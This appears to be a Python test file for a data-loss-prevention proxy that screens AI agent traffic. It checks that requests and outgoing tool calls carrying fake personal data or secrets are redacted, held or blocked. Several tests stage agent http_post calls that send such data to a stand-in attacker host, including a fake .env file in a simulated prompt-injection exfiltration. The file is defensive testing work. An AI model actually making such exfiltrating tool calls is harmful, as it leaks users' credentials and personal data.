"""The entity types Fragmos added, through the real detector and policy.yaml: what a request carrying one does, what
a tool call carrying one to an unlisted host does, and what routine agent traffic must not trip. Every value is fake."""

import base64
import random
from pathlib import Path

import pytest

from demo import agent as demo
from demo.sim_upstream import COLLECTOR
from sentinel.core.model import Action
from test_gaps import (EVIL, assert_blocked, assert_stayed_local, assistant, cloud_saw, egress, model_reply, run_body,
                       text, tool_use, user)

DATA = Path(__file__).parent.parent / "demo" / "data"

# entity type -> (a sentence carrying one value, the value, the request action, the egress action to an unlisted host)
TYPES = {
    "UK_NINO": ("Her NI number is AB 12 34 56 C.", "AB 12 34 56 C", Action.REROUTE, Action.BLOCK),
    "IBAN_CODE": ("Wire it to GB82 WEST 1234 5698 7654 32.", "GB82 WEST 1234 5698 7654 32", Action.REDACT, Action.HOLD),
    "CRYPTO": ("Pay 0x52908400098527886E0F7030069857D2E4169EE7 back.", "0x52908400098527886E0F7030069857D2E4169EE7",
               Action.REDACT, Action.HOLD),
    "US_EIN": ("The employer number is 12-3456789.", "12-3456789", Action.REDACT, Action.HOLD),
    "DATE_OF_BIRTH": ("DOB: 01/02/1990", "DOB: 01/02/1990", Action.REDACT, Action.HOLD),
    "MAC_ADDRESS": ("The printer is 00:1A:2B:3C:4D:5E.", "00:1A:2B:3C:4D:5E", Action.REDACT, Action.ALLOW),
    "PROJECT_CODENAME": ("Project Falcon ships in the spring.", "Project Falcon", Action.REDACT, Action.ALLOW),
    "IP_ADDRESS": ("The staging box is 10.0.4.12.", "10.0.4.12", Action.ALLOW, Action.ALLOW),
    "UUID": ("Request 550e8400-e29b-41d4-a716-446655440000 failed.", "550e8400-e29b-41d4-a716-446655440000",
             Action.ALLOW, Action.ALLOW),
}


@pytest.mark.parametrize("entity, sentence, value, action", [(e, s, v, a) for e, (s, v, a, _) in TYPES.items()],
                         ids=list(TYPES))
def test_a_request_carrying_the_type_gets_its_tier_action(presidio, entity, sentence, value, action):
    _, ports = run_body({"messages": [user(text(sentence))]}, presidio)
    request = ports.events[-1].request
    assert request.action is action and entity in request.entity_counts
    if action is Action.REROUTE:
        assert_stayed_local(ports)
    elif action is Action.REDACT:
        assert value not in cloud_saw(ports) and f"[{entity}_1]" in cloud_saw(ports)
    else:
        assert value in cloud_saw(ports)


@pytest.mark.parametrize("entity, sentence, action", [(e, s, a) for e, (s, _, _, a) in TYPES.items()], ids=list(TYPES))
def test_a_tool_call_carrying_the_type_to_an_unlisted_host_gets_its_egress_action(presidio, entity, sentence, action):
    out, ports = egress(model_reply(tool_use("http_post", url=EVIL, body=sentence)), presidio)
    [verdict] = ports.events[-1].egress
    assert verdict.action is action and entity in verdict.entities
    if action is Action.BLOCK:
        assert_blocked(out)
    else:
        assert len(ports.holds) == (action is Action.HOLD)
        assert [b["name"] for b in out["content"] if b["type"] == "tool_use"] == ["http_post"]


@pytest.mark.parametrize("url", ["http://127.0.0.1:8788/travel-blog.html", "http://localhost:8788/travel-blog.html"],
                         ids=["loopback-ip", "localhost"])
def test_fetching_a_local_page_is_neither_redacted_nor_held(presidio, url):
    out, ports = run_body({"messages": [user(text(f"Summarize the blog post at {url}."))]}, presidio,
                          reply=model_reply(tool_use("web_fetch", url=url)))
    assert ports.events[-1].request.action is Action.ALLOW and url in cloud_saw(ports)
    assert ports.holds == [] and [b["input"] for b in out["content"] if b["type"] == "tool_use"] == [{"url": url}]


@pytest.mark.parametrize("tool_id", [
    "toolu_01A09q90qw90lq917835lq9", "call_e18a2dd95d5840dba2d9eb17", "tooluse_kZJMlvQmRJ6eAyJE5GIl7Q",
    "550e8400-e29b-41d4-a716-446655440000",
], ids=["anthropic", "deepseek", "unknown-upstream", "uuid"])
def test_a_random_tool_id_does_not_keep_a_conversation_off_the_cloud(presidio, tool_id):
    messages = [user(text("Read the notes.")), assistant(tool_use("read_file", tool_id, path="notes.txt")),
                user({"type": "tool_result", "tool_use_id": tool_id, "content": "Buy milk."})]
    _, ports = run_body({"messages": messages}, presidio)
    assert ports.events[-1].request.action is Action.ALLOW and [c["upstream"] for c in ports.calls] == ["cloud"]


def test_a_screenshot_is_not_read_as_a_page_of_secrets(presidio):
    data = base64.b64encode(random.Random(7).randbytes(60_000)).decode()
    screenshot = {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": data}}
    _, ports = run_body({"messages": [user(text("What is on this screen?"), screenshot)]}, presidio)
    assert ports.events[-1].request.action is Action.ALLOW


@pytest.mark.parametrize("prose", [
    "The password policy: at least 8 characters and one symbol.",
    "tokens like [PERSON_1] or [EMAIL_ADDRESS_2] are placeholders for real values",
], ids=["reads-as-an-assignment-without-its-spaces", "the-redaction-note"])
def test_plain_prose_is_not_a_secret(presidio, prose):
    _, ports = run_body({"messages": [user(text(prose))]}, presidio)
    assert ports.events[-1].request.action is Action.ALLOW


def demo_turn(tool, argument, result):
    """What the demo agent sends once a tool has answered: its system prompt, its tools, and the result."""
    return {"system": demo.SYSTEM, "tools": demo.TOOLS, "messages": [
        user(text("Do the task.")), assistant(tool_use(tool, "call_e18a2dd95d5840dba2d9eb17", **argument)),
        user({"type": "tool_result", "tool_use_id": "call_e18a2dd95d5840dba2d9eb17", "content": result})]}


@pytest.mark.parametrize("file, action, rule", [
    ("patient_note.txt", Action.REROUTE, "restricted-stays-local"),
    ("patient_note_light.txt", Action.REDACT, "confidential-redacted"),
    ("employees.csv", Action.REROUTE, "restricted-stays-local"),
    (".env.fake", Action.REROUTE, "secrets-never-leave"),
])
def test_the_demo_files_keep_their_actions(presidio, file, action, rule):
    _, ports = run_body(demo_turn("read_file", {"path": file}, (DATA / file).read_text()), presidio)
    request = ports.events[-1].request
    assert (request.action, request.rule) == (action, rule)


def test_the_demo_prompts_alone_carry_nothing_restricted(presidio):
    for prompt in demo.SCENARIOS.values():
        _, ports = run_body({"system": demo.SYSTEM, "tools": demo.TOOLS, "messages": [user(text(prompt))]}, presidio)
        assert ports.events[-1].request.action in (Action.ALLOW, Action.REDACT), prompt
        assert [c["upstream"] for c in ports.calls] == ["cloud"], prompt


def test_the_demo_exfiltration_is_still_blocked(presidio):
    stolen = (DATA / ".env.fake").read_text()
    out, ports = egress(model_reply(tool_use("http_post", url=COLLECTOR, body=stolen)), presidio)
    assert_blocked(out, stolen.strip())
    assert "possible prompt injection" in ports.events[-1].egress[0].reason
